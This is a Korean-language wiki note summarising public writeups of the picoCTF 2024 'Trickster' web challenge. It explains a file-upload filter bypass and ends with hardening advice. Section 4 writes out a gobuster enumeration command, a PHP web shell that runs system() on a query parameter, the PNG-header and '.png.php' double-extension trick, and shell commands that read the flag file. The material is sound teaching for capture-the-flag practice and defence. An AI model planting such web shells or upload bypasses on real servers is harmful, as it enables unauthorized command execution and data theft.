---
title: Trickster — picoCTF 2024 web writeup
created: 2026-06-14
updated: 2026-06-21
type: query
tags: [ctf, web, writeup, file-upload, upload-bypass, rce]
sources: [https://github.com/noamgariani11/picoCTF-2024-Writeup/blob/main/Web%20Exploitation/Trickster.md, https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18, https://dev.to/yowise/trickster-picoctf-2024-1j5j, https://brandon-t-elliott.github.io/trickster]
confidence: high
---

# Trickster — picoCTF 2024 web writeup

> `PNG images only`라는 안내를 **파일명 검사 + magic bytes 검사 + 웹 실행 경로**의 허점을 이용해 우회하는 대표적인 file upload writeup입니다.

## 참고 URL
- [Original writeup](https://github.com/noamgariani11/picoCTF-2024-Writeup/blob/main/Web%20Exploitation/Trickster.md)
- [medium.com](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)
- [dev.to](https://dev.to/yowise/trickster-picoctf-2024-1j5j)
- [brandon-t-elliott.github.io](https://brandon-t-elliott.github.io/trickster)


## 1. 한 줄 요약

`Trickster`는 업로드 파일이 PNG인지 검사하는 것처럼 보이지만, 실제로는 느슨한 검증을 통과한 뒤 웹에서 실행되는 업로드 파일을 통해 명령 실행까지 연결되는 문제입니다. 공개 writeup들은 공통적으로 `robots.txt` / `instructions.txt`를 통해 업로드 규칙을 확인하고, PNG 헤더를 붙인 PHP payload를 업로드한 뒤 `/uploads` 경로에서 실행하는 흐름을 설명합니다.

## 2. 문제 메타데이터

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2024 |
| 카테고리 | Web Exploitation |
| 문제명 | Trickster |
| 핵심 유형 | [[file-upload-ctf-patterns]] |
| 보조 개념 | [[file-upload]], [[path-traversal]], [[rce]] |
| 재사용 패턴 | upload filter bypass → web-accessible storage → command execution |
| 난이도 | Easy로 분류된 공개 writeup이 많습니다 |

## 3. 공격면

| 요소 | 관찰 |
|------|------|
| 메인 페이지 | PNG만 허용하는 업로드 폼 |
| `robots.txt` | 숨겨진 경로를 찾는 단서 |
| `instructions.txt` | PNG signature 조건을 명시 |
| `/uploads/` | 업로드된 파일이 접근되는 위치 |

## 4. 풀이 흐름

### 4.1 숨은 규칙 찾기

먼저 디렉터리 열거로 `robots.txt`와 `instructions.txt`를 확인합니다. 공개 writeup들은 이 단계에서 업로드 조건을 얻는다고 공통적으로 설명합니다.

```bash
# 숨겨진 경로와 업로드 관련 파일을 찾기 위한 예시입니다.
# 예상 출력: /robots.txt, /uploads, /instructions.txt 같은 경로

gobuster dir -u http://atlas.picoctf.net:60322/ -w /usr/share/dirb/wordlists/big.txt  # 업로드 힌트 경로를 찾습니다.
```

### 4.2 업로드 필터 이해하기

`instructions.txt`를 보면 PNG 확장자와 PNG signature를 요구합니다. 하지만 많은 writeup은 이 검사가 충분히 엄격하지 않다고 지적합니다.

핵심 관찰은 두 가지입니다.

1. 파일명에 `.png`가 **포함**되면 통과할 수 있습니다.
2. 파일 내용은 **완전한 PNG가 아니라 앞부분 signature**만 맞아도 통과할 수 있습니다.

### 4.3 PHP payload를 PNG처럼 보이게 만들기

공개 writeup은 PNG magic bytes를 앞에 붙이고, 뒤에 PHP 코드를 이어 붙인 **polyglot 파일** 또는 유사한 파일을 사용합니다.

```php
<?php
// PNG signature 뒤에 붙는 간단한 PHP 명령 실행 예시입니다.
if (isset($_GET['cmd'])) {
    system($_GET['cmd']); // 예상 출력: 입력한 명령의 결과
}
?>
```

파일명은 보통 `something.png.php`처럼 만듭니다. 이렇게 하면 단순한 확장자 검사를 통과하면서도, 서버가 PHP로 처리할 가능성을 남깁니다.

### 4.4 업로드 후 실행 확인

업로드가 성공하면 `/uploads/<filename>` 형태로 접근 가능한 경우가 많습니다. 이 경로에서 PHP 코드가 실행되면 곧바로 명령 실행 인터페이스가 됩니다.

```bash
# 업로드된 웹셸에서 현재 경로와 주변 파일을 확인하는 예시입니다.
# 예상 출력: /var/www/html/uploads, 상위 디렉터리의 텍스트 파일 목록

pwd   # 현재 작업 디렉터리를 확인합니다.
ls .. # 상위 디렉터리의 파일을 확인합니다.
cat ../MFRDAZLDMUYDG.txt  # 플래그 파일이 보이면 내용을 읽습니다.
```

### 4.5 flag 회수

상위 디렉터리에서 의심스러운 `.txt` 파일을 찾아 읽으면 flag를 얻을 수 있습니다. 공개 writeup들은 `ls ..` 또는 `find` 계열 명령으로 위치를 찾는 흐름을 보여줍니다.

## 5. 핵심 포인트

1. **파일명 검사**는 확장자 전체가 아니라 문자열 포함 여부를 잘못 확인할 수 있습니다.
2. **magic bytes 검사**는 파일의 앞부분만 확인하고 나머지를 신뢰할 수 있습니다.
3. 업로드 파일이 **웹 실행 경로**에 저장되면 PHP payload가 살아납니다.
4. `robots.txt` / `instructions.txt`는 이 문제의 난이도를 크게 낮춰주는 실마리입니다.

## 6. 방어 관점

1. 업로드 파일명은 substring이 아니라 **정확한 allowlist**로 검사합니다.
2. 파일 형식은 magic bytes만 보지 말고 **실제 파서로 재인코딩/검증**합니다.
3. 업로드 파일은 **웹 루트 밖**에 저장합니다.
4. 업로드 디렉터리는 **실행 금지**로 설정합니다.
5. `robots.txt`에 민감한 운영 규칙을 힌트처럼 남기지 않습니다.

## 7. 동일 계열 문제 체크리스트

- [ ] `robots.txt`와 숨은 힌트 파일을 먼저 확인했는가?
- [ ] 확장자 검사인지, MIME 검사인지, magic bytes 검사인지 구분했는가?
- [ ] 더블 확장자(`.png.php`)가 가능한지 확인했는가?
- [ ] 업로드 경로가 웹에서 직접 실행되는가?
- [ ] 업로드 후 상위 디렉터리 또는 숨은 `.txt` 파일을 찾았는가?

## 8. 출처별 교차 확인

| 출처 | 확인한 내용 |
|------|-------------|
| noamgariani11 GitHub | PNG 헤더 + PHP payload, `.png.php`, 업로드 후 `/uploads` 접근 |
| Altair Medium | `robots.txt`, `instructions.txt`, PNG signature, web shell 흐름 |
| yowise DEV | 더블 확장자, LFI/업로드 경로 조합, 명령 실행 후 flag 탐색 |
| Brandon T. Elliott | PNG magic bytes, upload filter bypass, WebShell payload, flag 파일 위치 탐색 |

## 9. 관련 페이지

- [[trickster]]
- [[web-ctf-writeup-storage-upload]]
- [[web-ctf-writeup-curation]]
- [[web-ctf-writeup-topic-map]]
- [[file-upload-ctf-patterns]]
- [[file-upload]]
- [[rce]]
